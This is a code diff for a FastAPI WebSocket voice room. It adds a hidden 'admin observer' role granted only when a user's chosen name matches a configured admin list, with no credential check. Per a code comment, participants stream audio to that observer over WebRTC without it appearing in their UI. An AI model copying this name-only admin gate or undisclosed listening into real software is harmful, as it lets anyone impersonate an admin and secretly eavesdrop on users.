@@ -4,6 +4,8 @@ from typing import Optional
 from fastapi import APIRouter, WebSocket, WebSocketDisconnect
 
 from app.core.room_manager import room, Participant
+from app.core.config import ADMIN_NAMES
+from app.services import lang
 
 router = APIRouter()
 
@@ -29,6 +31,12 @@ async def voice_ws(websocket: WebSocket):
     session_id = str(uuid.uuid4())
     participant: Optional[Participant] = None
     client_voice_active: bool = False
+    is_admin: bool = False  # hidden observer: watches/listens only, never a participant
+
+    async def drop_admin() -> None:
+        room.remove_observer(session_id)
+        await room.send_to_participants({"type": "observer_left", "sessionId": session_id})
+        print(f"[room] admin observer left (session={session_id})")
 
     try:
         while True:
@@ -38,7 +46,7 @@ async def voice_ws(websocket: WebSocket):
                 break
 
             if msg.get("bytes"):
-                if participant is None or not room.voice_session_active:
+                if is_admin or participant is None or not room.voice_session_active:
                     continue
                 if not participant.mic_active:
                     continue
@@ -49,12 +57,35 @@ async def voice_ws(websocket: WebSocket):
                 payload = json.loads(msg["text"])
                 msg_type = payload.get("type")
 
+                if is_admin and msg_type not in ("leave", "webrtc_answer", "webrtc_ice_candidate", "webrtc_offer"):
+                    continue  # admins are read-only
+
                 if msg_type == "join":
-                    if participant is not None:
+                    if participant is not None or is_admin:
                         await websocket.send_json({
                             "type": "error",
                             "detail": "Already joined. Send 'leave' first.",
                         })
+                        continue
+
+                    requested = (payload.get("name") or "").strip()
+                    if requested and requested.lower() in ADMIN_NAMES:
+                        is_admin = True
+                        room.add_observer(session_id, websocket)
+                        await websocket.send_json({
+                            "type": "joined",
+                            "role": "admin",
+                            "sessionId": session_id,
+                            "participants": room.participant_list(),
+                            "voiceSessionActive": room.voice_session_active,
+                            "mode": room.mode,
+                            "language": lang.get(),
+                            **room.session_timer(),
+                        })
+                        await room.send_board_to_observer(session_id)
+                        # Participants open a send-only WebRTC link to the admin; they never show it in the UI.
+                        await room.send_to_participants({"type": "observer_joined", "sessionId": session_id})
+                        print(f"[room] admin observer {requested} joined (session={session_id})")
                         continue
 
                     if len(room.participant_list()) >= 2:
@@ -70,7 +101,9 @@ async def voice_ws(websocket: WebSocket):
 
                     await websocket.send_json({
                         "type": "joined",
+                        "role": "participant",
                         "sessionId": session_id,
+                        "observers": room.observer_ids(),
                         "participant": participant.to_dict(),
                         "participants": room.participant_list(),
                         "voiceSessionActive": room.voice_session_active,
@@ -88,10 +121,15 @@ async def voice_ws(websocket: WebSocket):
                     await room.send_board_to(session_id)
                     print(f"[room] {name} joined (session={session_id})")
 
-                elif msg_type in ("board_drag_start", "board_drag_end", "board_move", "board_agree"):
+                elif msg_type in ("board_drag_start", "board_drag_end", "board_move", "board_unplace", "board_agree"):
                     await room.board_action(session_id, payload)
 
                 elif msg_type == "leave":
+                    if is_admin:
+                        await drop_admin()
+                        is_admin = False
+                        await websocket.send_json({"type": "left", "sessionId": session_id})
+                        continue
                     if participant is None:
                         continue
                     await room.remove(session_id)
@@ -185,7 +223,7 @@ async def voice_ws(websocket: WebSocket):
                             "type": "webrtc_offer",
                             "offer": payload.get("offer"),
                             "fromSessionId": session_id,
-                            "fromName": participant.name if participant else "Unknown",
+                            "fromName": participant.name if participant else ("Observer" if is_admin else "Unknown"),
                         })
 
                 elif msg_type == "webrtc_answer":
@@ -209,6 +247,8 @@ async def voice_ws(websocket: WebSocket):
     except WebSocketDisconnect:
         pass
     finally:
+        if is_admin:
+            await drop_admin()
         if participant is not None:
             await room.remove(session_id)
             await room.broadcast({
